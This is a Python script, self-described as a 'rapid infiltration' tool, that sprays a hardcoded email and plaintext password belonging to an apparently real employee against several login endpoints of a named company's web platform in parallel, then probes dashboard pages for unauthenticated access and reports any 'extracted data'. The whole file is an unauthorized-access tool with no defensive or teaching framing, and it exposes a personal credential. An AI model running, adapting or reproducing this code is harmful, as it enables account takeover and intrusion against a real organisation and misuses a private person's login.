"""
NEXUS Rapid Intelligence Infiltration
Fast credential-based access with immediate results
"""

import requests
import json
from datetime import datetime
import concurrent.futures
import threading

class NexusRapidInfiltration:
    def __init__(self):
        self.base_url = "https://groundworks.ragleinc.com"
        self.credentials = {'email': 'bwatson@ragleinc.com', 'password': 'Bmw34774134'}
        self.results = {'status': 'running', 'findings': [], 'data': {}}
        
    def test_endpoint(self, endpoint, payload):
        """Test single endpoint with timeout"""
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            # JSON attempt
            response = session.post(endpoint, json=payload, timeout=3)
            if self.check_success(response):
                return {'endpoint': endpoint, 'success': True, 'method': 'json', 'status': response.status_code}
            
            # Form attempt
            response = session.post(endpoint, data=payload, timeout=3)
            if self.check_success(response):
                return {'endpoint': endpoint, 'success': True, 'method': 'form', 'status': response.status_code}
                
            return None
        except:
            return None
    
    def check_success(self, response):
        """Quick success check"""
        if response.status_code in [200, 201, 302]:
            content = response.text.lower()
            success_indicators = ['token', 'success', 'dashboard', 'welcome', 'authenticated']
            error_indicators = ['error', 'invalid', 'failed']
            
            has_success = any(indicator in content for indicator in success_indicators)
            has_error = any(indicator in content for indicator in error_indicators)
            
            return has_success and not has_error
        return False
    
    def execute_rapid_sweep(self):
        """Execute rapid parallel sweep"""
        endpoints = [
            f"{self.base_url}/api/auth/login",
            f"{self.base_url}/api/login", 
            f"{self.base_url}/login",
            f"{self.base_url}/Account/Login",
            f"{self.base_url}/api/authenticate"
        ]
        
        payloads = [
            {'email': self.credentials['email'], 'password': self.credentials['password']},
            {'username': self.credentials['email'], 'password': self.credentials['password']},
            {'EmailAddress': self.credentials['email'], 'Password': self.credentials['password']}
        ]
        
        # Parallel execution
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for endpoint in endpoints:
                for payload in payloads:
                    future = executor.submit(self.test_endpoint, endpoint, payload)
                    futures.append(future)
            
            # Collect results with timeout
            for future in concurrent.futures.as_completed(futures, timeout=10):
                try:
                    result = future.result()
                    if result and result.get('success'):
                        self.results['status'] = 'success'
                        self.results['findings'].append(f"Authentication successful at {result['endpoint']}")
                        self.results['data']['successful_auth'] = result
                        return True
                except:
                    continue
        
        # Test direct access
        return self.test_direct_access()
    
    def test_direct_access(self):
        """Test direct access to protected areas"""
        areas = [f"{self.base_url}/dashboard", f"{self.base_url}/home", f"{self.base_url}/portal"]
        
        for area in areas:
            try:
                response = requests.get(area, timeout=3)
                if response.status_code == 200:
                    content = response.text.lower()
                    if any(indicator in content for indicator in ['dashboard', 'navigation', 'logout']):
                        self.results['findings'].append(f"Direct access to {area}")
                        self.results['data']['accessible_area'] = area
                        return True
            except:
                continue
        
        self.results['status'] = 'no_access'
        return False
    
    def get_report(self):
        """Generate rapid report"""
        return {
            'timestamp': datetime.now().isoformat(),
            'target': 'GroundWorks Platform',
            'status': self.results['status'],
            'findings': self.results['findings'],
            'extracted_data': self.results['data']
        }

def execute_rapid_infiltration():
    """Execute rapid infiltration"""
    infiltrator = NexusRapidInfiltration()
    success = infiltrator.execute_rapid_sweep()
    return infiltrator.get_report()

if __name__ == "__main__":
    result = execute_rapid_infiltration()
    print(json.dumps(result, indent=2))